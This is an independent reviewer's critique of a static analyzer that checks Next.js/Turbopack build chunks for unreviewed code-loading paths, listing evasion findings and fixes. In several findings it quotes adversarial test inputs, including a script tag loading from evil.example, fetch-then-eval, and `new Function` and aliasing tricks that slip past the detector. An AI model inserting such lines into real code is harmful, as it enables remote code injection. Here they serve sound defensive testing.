# TL review — NQR Phase 2A emission adapter, Stage A iterations 5 + 6

Reviewer: independent TECH LEAD (did not write the code)
Date: 2026-09-19
Candidate: `scratchpad/nqr-stagea-a6/project` (frozen 0444)
Intermediate: `scratchpad/nqr-stagea-a5/project`
Artifact fixture: `scratchpad/nqr-stagea-a5/fixture/artifact` (Next 16.3.1, Turbopack)
Scratch (all writes): `scratchpad/review-stagea-a6-tl`

---

## Verdict

**REQUEST_CHANGES** on canonical5 `1876688e621217463bd89abe27d98ecd82e39a8566a9ae992ef33eddf585b328`.

The measurement work is sound and every number in the reports reproduces exactly. The change is
rejected on three grounds, in descending order of importance:

1. The one grammar that builds the dynamic-load graph (`exactDeferredLoader`) **matches nothing in
   real Turbopack output** — 11 real occurrences in the fixture, 0 matched — because the test
   fixtures use hand-picked distinct identifiers that the minifier does not produce (F1).
2. The digest pin on the runtime loader **does not cover the registration head**, and the head
   grammar admits `void <arbitrary expression>`; a runtime chunk that injects an external script is
   reported `STATIC_SUPPORTED` with zero diagnostics (F2).
3. Spec v2 §2.3 states claims the adapter does not support, and the closed list of context methods
   in §2.3 items 2–3 is incomplete and partly wrong against the runtime this very iteration
   modelled (F3, F4).

None of these is a live release risk today — `releaseDecision` is hard-coded `BLOCKED` and the real
artifact is `STATIC_UNKNOWN` either way. They are rejected because a gate whose written claims
exceed its behaviour is the specific failure mode spec §8 exists to prevent, and because F1 means
the adapter cannot read the construct the gate most needs (`/create`'s lazy PDF/renderer load).

---

## 1. Hashes and toolchain — all verified

```
$ node scratchpad/rebuild/canon.cjs scratchpad/nqr-stagea-a6/project
1876688e621217463bd89abe27d98ecd82e39a8566a9ae992ef33eddf585b328      ✔ matches brief

$ node scratchpad/rebuild/canon.cjs scratchpad/nqr-stagea-a5/project
add3eb52e5be93ee18d1db59d04b9b9b8f277fb84327ad97ce573de937845ce9      ✔ matches brief
```

Candidate toolchain digests match `SUPPORTED_PROFILE` byte for byte:

```
dc243091ba95352bbc300be22c6561d24a19a1c0bd2c2cc85d2c5168767ea7b9  node_modules/next/package.json
758cead0e9764f94320f938ac169fb95c7eeea30dc675a6e5b1133fae239fa19  .../compiled/acorn/acorn.js
159187fd5c0c0c17456282f4cf7beab91eb46dfc717928522938c947007282b7  node_modules/parse5/package.json
```

Runtime body pin, recomputed independently from the fixture's own runtime chunk with the candidate's
own acorn (`slice(body.body.start, body.body.end)`):

```
body bytes: 9356  digest: ca691e834197bcf5bfa5f0a4d4ad8e38e7e9902200683c5196b13491e0a1fe8d
```

Identical to `REVIEWED_RUNTIME_BODIES` including the byte count in the label. ✔

Candidate test suite, run in place: `npm run test:scripts` → **305/305 pass**, 0 fail. ✔

## 2. Reported numbers on the real artifact — reproduced exactly

Harness: `review-stagea-a6-tl/measure.mjs` (walks the artifact, builds both manifests from the tree
itself, calls `inspectTurbopackEmission`). `review-stagea-a6-tl/startup.mjs` partitions by subject.

```
staticStatus: STATIC_UNKNOWN   summary: {"unknownCount":603,"violationCount":0,"truncated":false}
files walked: 615   scope: 351

  6 CONFLICTING_MODULE_REGISTRATION_UNPROVEN     62 UNRESOLVED_MODULE_DESTINATION
  4 DUPLICATE_MODULE_REGISTRATION_UNPROVEN       17 UNREVIEWED_CHUNK_REFERENCE
 12 UNRESOLVED_CHUNK_LOAD                        22 UNSUPPORTED_FLIGHT_IMPORT_RECORD
  2 UNRESOLVED_MODULE_REFERENCE                 478 UNSUPPORTED_FLIGHT_WIRE_RECORD

startup chunks: 10   (9 named by route HTML + runtime otherChunks, plus the runtime chunk itself)
== diagnostics IN the startup set == 3
  1 UNRESOLVED_CHUNK_LOAD       static/chunks/0-68v-mavrx9j.js span 119817..119826
  2 UNRESOLVED_MODULE_REFERENCE static/chunks/0-68v-mavrx9j.js spans 119543.. / 120045..
```

- Iteration 6 §3 "3 unknowns in the startup set (10 chunks)" — **confirmed**.
- Iteration 6 §3 "478 `UNSUPPORTED_FLIGHT_WIRE_RECORD` + 22 `UNSUPPORTED_FLIGHT_IMPORT_RECORD`
  outside the startup set" — **confirmed**, exact.
- The 3 residual unknowns are the React Flight client bridge, not noise. Decoded spans:
  `e.r(t)`, `e.L(r[a])`, `e.r(t[0])` inside `resolveClientReference`/`requireModule`. The report's
  characterisation ("real things that should be asked about") is accurate and, to the candidate's
  credit, they are exactly the constructs the unparsed Flight wire feeds. The gate is honestly
  blocked here rather than accidentally green.

**Caveat the reports do not state.** The "3" is only checkable with instrumentation. All 62
`UNRESOLVED_MODULE_DESTINATION` rows carry subject `module:<id>`, which `fixedDiagnostic()`
rewrites to the literal string `"inspection"` (`safeRelative` rejects `:`), so they cannot be
attributed to a chunk from the output. I re-ran with the subject replaced by
`requirement.subject` (`review-stagea-a6-tl/work/scripts/attrib.mjs`):

```
   2 static/chunks/0ejtf2ywlvkxz.js      58 static/chunks/1hduh4i4eljw_.js      2 static/chunks/3zhjgw6hul87x.js
total 62   in startup: 0   outside: 62
```

So the "3" survives — but only because I patched the adapter to find out. See F7.

Scope note: `SUPPORTED_PROFILE.routes` is the 22 prerendered public routes. Surface B
(`/[locale]/create`, spec v2 §2.2) is not implemented in this adapter, so the 3-unknown figure
describes surface A only. Spec v2 §5 item 3 already admits this; not counted as a finding.

---

## 3. Findings

### F1 — HIGH — The reviewed deferred-loader grammar matches **no** real emission; 11 occurrences, 0 matched

`exactDeferredLoader` is the only construct in `inspectFactory` that produces the
`deferred-thunk-creation` / `explicit-chunk-load` / `AFTER_CHUNK_LOAD` edges — i.e. the dynamic-load
graph the gate exists to build. It never fires on real output.

Real emission in the fixture (`static/chunks/0ejtf2ywlvkxz.js`, offset ~263):

```js
e=>{e.v(t=>Promise.all(["static/chunks/18-y6rumlrmrt.js","static/chunks/1-b2ubvwkmsdh.js"]
        .map(t=>e.l(t))).then(()=>t(55749)))}
```

The minifier reuses `t` for both the callback parameter and the shadowed `.map` parameter. The guard

```js
|| [contextName, callbackName].includes(mapper.params[0].name)) return false;
```

rejects it. The test fixture uses three distinct names (`t.v(l=>...map(x=>t.l(x)).then(()=>l(9)))`),
which is why no test caught this.

Controlled demonstration (`review-stagea-a6-tl/attacks6.mjs`), identical except for identifier names:

```
F1 REAL minified shape   (callback and mapper both `t`)  -> deferred-thunk-creation edge ABSENT
                                                            UNRESOLVED_CHUNK_LOAD x1, UNREVIEWED_CHUNK_REFERENCE x1
F2 test-fixture shape    (distinct names c / x / e)      -> deferred-thunk-creation edge PRESENT
```

Across the whole real artifact:

```
deferred-thunk-creation edges: 0        explicit-chunk-load edges: 0
static/chunks/0ejtf2ywlvkxz.js  UNRESOLVED_CHUNK_LOAD x3, UNREVIEWED_CHUNK_REFERENCE x6
static/chunks/18-y6rumlrmrt.js  UNRESOLVED_CHUNK_LOAD x3, UNREVIEWED_CHUNK_REFERENCE x3
static/chunks/3lm2-z3ro60an.js  UNRESOLVED_CHUNK_LOAD x2, UNREVIEWED_CHUNK_REFERENCE x2
static/chunks/3zhjgw6hul87x.js  UNRESOLVED_CHUNK_LOAD x3, UNREVIEWED_CHUNK_REFERENCE x6
```

It fails **closed**, so this is not a bypass. It is a capability failure, and it matters more than
the residual-3 headline: the lazy chunk load is precisely how the generator and PDF code reach
`/[locale]/create`, which is the whole reason NQR-129 exists. On surface B every such load will be
UNKNOWN, and the gate can never reach SUPPORTED no matter how much Flight-wire work iteration 7 does.

Iteration 6 §2's table row — "deferred loader in the reviewed form (`context.v(...)`) | unchanged in
every respect, including the rejection when `Promise` is shadowed" — reads as a working control. It
is not one. Please fix the shadow guard (the check should be that the mapper parameter is not
`contextName`; reusing the callback name is harmless because the mapper body is already pinned to
`context.l(<mapper param>)`), add a fixture taken verbatim from real emission, and re-measure.

### F2 — HIGH (claim) / MEDIUM (exploitability) — the runtime digest pin does not cover the registration head

The code comment sells the pin as total:

> "A new Next.js version, a different build configuration or **any edit to the runtime** changes the
> digest and returns the chunk to UNKNOWN, which blocks."

The digest covers `loader.callee.body` only. The registration head sits outside it, and
`currentScriptArgument()` checks only `alternate.operator === "void"` — it never checks the operand.
The ordinary-chunk path (`registrationHead()`) *does* require `alternate.argument.value === 0`, so
this is an asymmetry introduced by iteration 5, not a deliberate policy.

`review-stagea-a6-tl/runtime-attack.mjs` takes the fixture's genuine runtime chunk and rewrites only
the head, leaving the 9356 pinned bytes untouched:

```
STATIC_SUPPORTED  reviewed-runtime=true  baseline (unmodified real runtime)
STATIC_SUPPORTED  reviewed-runtime=true  void <side effect> in the currentScript alternate
STATIC_SUPPORTED  reviewed-runtime=true  void <arbitrary IIFE> in the alternate
```

Variant 2 injects `<script src="https://evil.example/p.js">` into `document.head` and overwrites
`self.TURBOPACK_ASSET_SUFFIX`; variant 3 is `void (()=>{fetch("/api/x").then(r=>r.text()).then(eval)})()`.
Both are admitted as `reviewed-runtime` with **zero diagnostics**. The same tamper on an ordinary
chunk is caught (`UNSUPPORTED_TOP_LEVEL_EXECUTABLE`).

Two consequences: (a) the comment is false as written; (b) a Next patch upgrade that changes only
the registration head is silently admitted against a stale reviewed body, which is the opposite of
the stated fail-closed behaviour.

The fix is free. Mutant M25 — tightening `currentScriptArgument` to require `void 0` exactly — still
passes 42/42 of the candidate's own tests, so nothing depends on the loose form.

### F3 — HIGH — spec v2 §2.3 claims more than the adapter does; iteration 6 §6 and §2.3 contradict each other

Spec v2 §2.3 item 2: *"every byte-fetching construct in the code — `context.l`, `L`, `b`, `w`, `u`
and `import()` — is read, converted to a path, and must point at a chunk the artifact really has."*
Closing sentence: PASS means *"there is no byte-fetching path that cannot be followed."*

That is false, and iteration 6 §6 already says so ("if it loads by some other means entirely, e.g.
building a `<script>` itself, it will not be caught at this layer"). The normative PM-owned document
does not carry that limitation, and the closing sentence directly contradicts it. Measured
(`review-stagea-a6-tl/attacks.mjs`, all reported `STATIC_SUPPORTED`, zero diagnostics):

```
A1  document.createElement("script"); s.src="https://evil.example/x.js"     MISSED
A2  s.src = "/_next/"+"static/chunks/"+"lazy"+".js"                          MISSED
A3  fetch("/api/blob").then(r=>r.text()).then(x=>eval(x))                    MISSED
A6  s.src = `static/chunks/lazy.js`   (template literal)                     MISSED
A12 new Function("return import('/_next/static/chunks/lazy.js')")()          MISSED
A19 t.g.eval("x")          (context.g IS globalThis in this runtime)         MISSED
A22 s.src = "/_next/static/chunks/lazy.js?v=1"                               MISSED
```

A22 is worth separating: `CHUNK_LITERAL` is `/^(?:\/_next\/)?static\/chunks\/[^\s]*\.(?:js|css)$/`,
but the runtime's own chunk-type test is `/\.js(?:\?[^#]*)?(?:#.*)?$/` and `A()` appends
`ASSET_SUFFIX` — a query string — to **every** chunk URL it builds. The backstop is narrower than
the runtime's own grammar for exactly the form the runtime always produces.

Caught for the record: A4 (worker, via the literal backstop), A5 (`import.meta` in a classic-mode
chunk → `UNSUPPORTED_JAVASCRIPT_SYNTAX`), A7 (`context.l` inside a class method — the AST walk is
genuinely deep, good), A8a/A8b/A8c (rest / destructured / absent factory parameter all
`UNSUPPORTED_FACTORY_SIGNATURE` — this attack vector is properly closed), C4 (optional chaining).

§2.3 must be rewritten to match the adapter, and the closing sentence removed or inverted. Note
§2.3 item 5 (PDF/renderer marker scan) is not in this adapter at all — it lives in
`scripts/verify-initial-bundle-boundary.mjs`. That is fine, but it means a green result from *this*
adapter establishes nothing about item 5.

### F4 — HIGH — the closed list of context methods is incomplete and partly wrong against the runtime this iteration modelled

I enumerated the context surface from the fixture's own runtime chunk
(`u = i.prototype`, `v = i.prototype` assignments) and cross-read the **unminified**
bundle-analyzer runtime in `node_modules` that the PM model doc cites, which carries real names:

| letter | real name (unminified runtime) | adapter's model | verdict |
| --- | --- | --- | --- |
| `l` | `loadChunk(chunkData)` | CHUNK, arg0 | correct |
| `L` | `loadChunkByUrl(chunkUrl)` | CHUNK_URL, arg0 | arg is a URL with `ASSET_SUFFIX`; always UNKNOWN in practice (fails closed) |
| `b` | `createWorker(WorkerConstructor, entrypoint, moduleChunks, opts)` | WORKER, **arg0** | **wrong argument** — arg0 is the constructor. Also, in *this* artifact's runtime `v.b = r` where `r = "/_next/"` — `b` is the base-path **string**, not a function at all |
| `w` / `u` | `loadWebAssembly` / `loadWebAssemblyModule` | arg0 | correct; both absent from this artifact's runtime |
| `r`,`i`,`A`,`f` | `require` / `esmImport` / `asyncModule-ish` / module context | module ref | `f`'s arg0 is a map object, not an id — over-approximated to UNKNOWN, acceptable |
| `s` | `esmExport(bindings, id)` | module ref at arg1 | correct id, but see F5 |
| **`R`** | `resolvePathFromModule(moduleId)` | **not modelled** | **module reference, unchecked** |
| **`j`** | `dynamicExport(object, id)` | **not modelled** | **module reference, unchecked** |
| **`n`** | `exportNamespace(namespace, id)` | **not modelled** | **module reference, unchecked** |
| **`q`** | `exportUrl(url, id)` | **not modelled** | **module reference, unchecked** |
| **`v`** | `exportValue(value, id)` | only the deferred shape | **2-arg form unchecked** |
| `t` | Node `require` | not modelled | unchecked |
| `M` | the `moduleFactories` Map | not modelled | `t.M.set(id, fn)` installs a factory at runtime, invisible |
| `g` | `globalThis` | not modelled | total escape hatch |

Measured — every one reported `STATIC_SUPPORTED`, zero diagnostics:

```
A13 t.R(4242)        A13b t.R(window.q)     A14 t.j([...],4242)    A15 t.n({},4242)
A16 t.v({},4242)     A17 t.q("/x",4242)     A18 t.M.set(4242,fn)   A20 t.t("child_process")
```

**This includes an undisclosed regression.** Iteration 5 flagged `["n","j","r","i","l","A"]` and had a
catch-all `UNSUPPORTED_CONTEXT_OPERATION` for *any* unreviewed context method. Run against the same
attacks:

```
a5:  A13 UNSUPPORTED_CONTEXT_OPERATION   A14 UNSUPPORTED_CONTEXT_OPERATION
     A15 UNSUPPORTED_CONTEXT_OPERATION   A16/A17/A20 UNSUPPORTED_CONTEXT_OPERATION
```

Five diagnostic codes disappeared in iteration 6 (`UNSUPPORTED_CONTEXT_OPERATION`,
`UNSUPPORTED_FACTORY_EFFECT`, `UNPROVEN_FACTORY_INVOCATION`, `UNSUPPORTED_EXPORT_VALUE`,
`UNSUPPORTED_FACTORY_BODY`). §2 discloses only the removal of `reviewedExportBindings`.

Dropping the blanket statement-level claim is the Product Owner's call and I do not contest it. But
the PM gap report's own argument for the new policy is that load constructs *"are a finite set, and
therefore enumerable"* — and the enumeration shipped here is neither complete nor accurate against
the runtime the same iteration reverse-engineered. Losing the catch-all for unknown context methods
is a separate decision from withdrawing the statement-level claim, and it was not surfaced for review.

**Recommendation:** restore a catch-all — any `context.<method>` call whose letter is not in a
reviewed table should be UNKNOWN. That is cheap (the real letter set is ~23) and restores
fail-closed behaviour on the next Next.js upgrade that adds a method.

### F5 — MEDIUM — `context.s` returns before traversing its arguments

```js
if (method === "s") {
  const source = node.arguments[1];
  if (literalInteger(source)) { ...edge + requirement... }
  else if (source) { UNRESOLVED_MODULE_REFERENCE }
  return;                      // <-- arguments[0] is never visited
}
```

Every other branch traverses (`LOADING` visits `slice(1)`, `MODULE_CONTEXT` visits all). Controlled
pair — identical load, only its position differs:

```
D1  t.s([["x",0,(t.l(window.q),1)]],7)            -> STATIC_SUPPORTED  (missed)
D2  var z=(t.l(window.q),1); t.s([["x",0,z]],7)   -> STATIC_UNKNOWN: UNRESOLVED_CHUNK_LOAD  (caught)
```

`esmExport`'s bindings array holds arbitrary getter functions in real emission, so this is a live
blind spot, not a contrived one. Fix: fall through to the generic traversal instead of returning.

### F6 — MEDIUM — the modelled load constructs are evaded by ordinary aliasing and indirect calls

`contextCall()` requires `callee.object` to be an `Identifier` whose name is literally the first
parameter, and `callee.computed === false`. All of the following are the *modelled* construct spelled
differently, and all report `STATIC_SUPPORTED` with zero diagnostics:

```
A9   var c=t; c.l(window.q)                      MISSED
A10  t["l"](window.q)                            MISSED
A10b var k="l"; t[k](window.q)                   MISSED
C1   (0,t.l)(window.q)                           MISSED   <- standard minifier output
C2   t.l.call(t,window.q)                        MISSED
C3   t.l.bind(t)(window.q)                       MISSED
C6   var f=()=>{var c=t;return c.L(window.q)};f()  MISSED
C8   var o={get x(){var c=t;return c.l(window.q)}}  MISSED
```

C1 is the one I would act on regardless of threat model: `(0,t.l)(x)` is what minifiers emit to drop
a `this` binding, and it is plausible in a future Next/Turbopack release. When the argument is a
literal the `UNREVIEWED_CHUNK_REFERENCE` backstop still fires (A9b, C1b caught), so the exposure is
specifically *alias + non-literal target* — which is the exact case the code comment says "is exactly
the case it must not wave through."

Under the realistic threat model (detecting our own build drifting, not a hostile bundler) this is
brittleness rather than attack surface, and I weight it MEDIUM accordingly. It nonetheless falsifies
§2.3 item 2 as written.

### F7 — LOW/MEDIUM — 62 findings are emitted with no usable subject

`fixedDiagnostic()` rewrites any `module:<id>` subject to `"inspection"` because `safeRelative()`
rejects `:`. Iteration 6 newly routes `UNRESOLVED_MODULE_DESTINATION` for `kind: "context"` through
it, so 62 of the 603 findings on the real artifact are unattributable in the output. Pre-existing
mechanism, newly load-bearing. It is why the "3 in the startup set" claim cannot be checked from the
adapter's output alone. Suggest emitting `requirement.subject` (a chunk path, which survives
`safeRelative`) and carrying the module id in a separate field.

### F8 — LOW — surviving mutants (independent run)

`review-stagea-a6-tl/mutate.mjs`, 32 mutants against the candidate's own 42-test file.
**28 killed, 4 survived.** Iteration 6 §5 reports 14 mutants, 0 survivors; none of my 4 is in that list.

| mutant | effect | note |
| --- | --- | --- |
| M19 | remove `new Set(parameterNames).size !== parameterNames.length` | duplicate factory params accepted; guard never exercised. Not exploitable (a duplicate name binds to the *last* parameter, so the context becomes unreachable rather than confusable) but it is untested code |
| M24 | `currentScriptArgument` accepts `void <anything>` | **this is the shipped behaviour** — see F2 |
| M25 | *tighten* to require `void 0` exactly | passes 42/42 → the F2 fix costs nothing |
| M29 | allow negative `runtimeModuleIds` | untested guard; fails closed anyway (a negative id can never be registered) |

The candidate's own mutation coverage is otherwise strong: dropping any single letter from either
context-method table, skipping `import()`, skipping the literal backstop, not marking consumed
literals, accepting any runtime body digest, and shallow AST traversal were all killed.

---

## 4. Task 6 — the three deliberately changed test expectations

| # | change | verdict |
| --- | --- | --- |
| 1 | benign IIFE: `UNPROVEN_FACTORY_INVOCATION` → unflagged unless it contains a chunk path | **Defensible.** `context.v` is `exportValue`; flagging every computed export was unactionable noise and this is squarely inside the withdrawn claim. The `UNREVIEWED_CHUNK_REFERENCE` backstop replaces the part that mattered |
| 2 | export tuple: judged by shape → judged by destination | **Direction defensible, implementation not.** Requiring the alias target to be registered somewhere in the artifact is strictly stronger than the old `reviewedExportBindings` shape check, and the paired fixture (dangling → UNKNOWN, present → SUPPORTED) is a good test. But the rewrite introduced F5, an argument-traversal skip that no previous version had. Fix F5 and this change stands |
| 3 | shadowed `Promise` in a deferred loader: `UNSUPPORTED_EXPORT_VALUE` → `UNRESOLVED_CHUNK_LOAD` | **Defensible.** Same severity (UNKNOWN), more accurate code. No control weakened |

None of the three weakens a control a previous review asked for. The change that *does* — removing
the `UNSUPPORTED_CONTEXT_OPERATION` catch-all and dropping `n`/`j` (F4) — is a fourth behavioural
change that §5 does not list. Iteration 3's review explicitly recorded the IIFE →
`UNPROVEN_FACTORY_INVOCATION` behaviour as a checked item; superseding it is legitimate under the PO
withdrawal, but the report should name it as superseding a prior review checkpoint rather than as a
test-expectation tidy-up.

## 5. Task 4 — is the runtime model sound?

**Pinning the IIFE body by digest is the right call**, and I would keep it. Reading a bundler-generated
module loader statement by statement is not something this team can honestly claim, and the digest
converts an unbounded review into a bounded one. The body genuinely is self-contained — `CHUNK_BASE_PATH`,
`ASSET_SUFFIX`, the backend and the whole context prototype are all declared inside it — so pinning
it does pin the semantics. Two defects, both fixable without changing the approach:

- **The pin has a hole at the head** (F2). The head is attacker-reachable and its grammar admits
  arbitrary code. Tighten `currentScriptArgument` to require `void 0` — M25 shows it is free — and
  consider extending the digest to cover the whole source minus the `otherChunks`/`runtimeModuleIds`
  literals.
- **Two independent implementations of the same grammar have drifted.** `registrationHead` +
  `turbopackReceiver` (ordinary chunks) and `currentScriptArgument` + `turbopackPushCallee` (runtime
  chunks) encode the same shape with different strictness; the runtime pair is the looser one. They
  should be one function.

**On a Next patch upgrade:** the intended behaviour holds — a changed loader body changes the digest,
`inspectRuntimeChunk` returns null, `UNSUPPORTED_RUNTIME_BACKEND_SEMANTICS` fires, release blocks.
Fail-closed, correct, and cheap to re-admit. The exception is the head-only change described above.
Separately, `REVIEWED_RUNTIME_BODIES` has no binding between a digest and the Next version it came
from; `SUPPORTED_PROFILE.nextVersion` is checked independently, so a stale entry cannot be admitted
under a new version today, but pairing them explicitly would be cheaper to audit.

**Is the registration grammar too permissive?** Yes, in three specific places: the `void` operand
(F2); `turbopackReceiver` does not check `.optional` where `turbopackPushCallee` does; and
`registrationPayload` accepts a duplicated property name in the parameter object on the reasoning
that "both names must resolve below". That reasoning is correct as written, and I verified the
mutant for extra properties (M28) is killed — no action needed there, but the comment is doing load
that a two-line duplicate check would do more obviously.

---

## 6. What I could not verify

- **No build permission.** I could not confirm that `SUPPORTED_PROFILE.sourceInventorySha256` /
  `dependencySha256` correspond to the candidate tree, nor that the fixture artifact came from an
  unmodified build of this source. Spec v2 §5 item 1 already lists the first as outstanding; I am
  restating it because every measurement in §2 above inherits the assumption.
- **No browser.** Spec v2 §3 scenarios A1/B1–B8 are untested by me. Every timing claim in this
  review is static-only.
- **Surface B** (`/[locale]/create`, spec §2.2) is not implemented; I could not measure it. Given F1,
  I expect it to be dominated by UNKNOWN deferred loads.
- **Flight wire grammar** (478 + 22) — out of scope for iteration 6 by agreement; not reviewed.
- `python3` is gated behind an unaccepted Xcode licence on this machine. I did **not** accept the
  licence; I used node for the same scripting. `git log` in SOURCE also fails with exit 69 for the
  same reason, so I did not inspect repository history. Neither blocked the review.

## 7. What must change before I would accept

1. **F1** — fix the deferred-loader shadow guard, add a fixture copied verbatim from real emission,
   re-measure the artifact and republish the graph-edge counts.
2. **F2** — require `void 0` exactly in the runtime registration head (M25 shows no test depends on
   the looser form); correct the code comment about what the digest covers.
3. **F4** — restore a catch-all UNKNOWN for context methods outside a reviewed table, and correct
   the table (`b` is not a chunk-loading call with the chunk at arg0; `R`/`j`/`n`/`q`/`v(value,id)`
   are module references).
4. **F5** — let `context.s` fall through to generic traversal instead of returning.
5. **Spec v2 §2.3** — rewrite items 2 and 3 to the adapter's real scope, and delete or invert the
   closing sentence "there is no byte-fetching path that cannot be followed". Fold iteration 6 §6's
   limitation into the PM-owned document rather than leaving it only in the implementation report.
6. **Iteration 6 §5** — disclose the removal of the `UNSUPPORTED_CONTEXT_OPERATION` catch-all and of
   the five diagnostic codes as a fourth deliberate change, and record the four surviving mutants
   above (or kill them).

F6 and F7 I would accept as recorded limitations with a written note rather than blocking, provided
§2.3 stops claiming otherwise.

## 8. Credit where due

The measurement discipline in this iteration is genuinely good: every number in iterations 5 and 6
reproduced to the digit against a real artifact, the residual 3 unknowns are correctly identified as
the Flight bridge rather than waved away, the factory-signature attack surface (rest, destructured,
absent, four-parameter) is properly closed, the AST walk is genuinely deep (nested functions, class
methods, getters all reached), and the candidate's own mutation set killed every mutant I aimed at
the new policy's core. The Product Owner's withdrawal of the statement-level claim is the right
engineering call and the reports argue it honestly. My objections are about the claims that were
written around the new policy, and about one grammar that was never tested against the bytes the
bundler actually emits.

---

### Reproduction index (all under `scratchpad/review-stagea-a6-tl/`)

| file | purpose |
| --- | --- |
| `measure.mjs` | run any adapter against a real artifact tree; builds both manifests from the tree |
| `startup.mjs` | partition diagnostics into the 10-chunk startup set and the rest |
| `attacks.mjs` / `attacks3.mjs` / `attacks4.mjs` / `attacks5.mjs` / `attacks6.mjs` | adversarial chunk suites A/C/D/E/F |
| `runtime-attack.mjs` | head-tamper test against the genuine runtime chunk |
| `mutate.mjs` | 32-mutant independent run against the candidate's own test file |
| `work/scripts/attrib.mjs` | adapter patched to attribute `UNRESOLVED_MODULE_DESTINATION` |
| `a6-real.json`, `a6-attrib.json` | full adapter output on the real artifact |

SOURCE, both candidate roots and the artifact fixture were not modified.
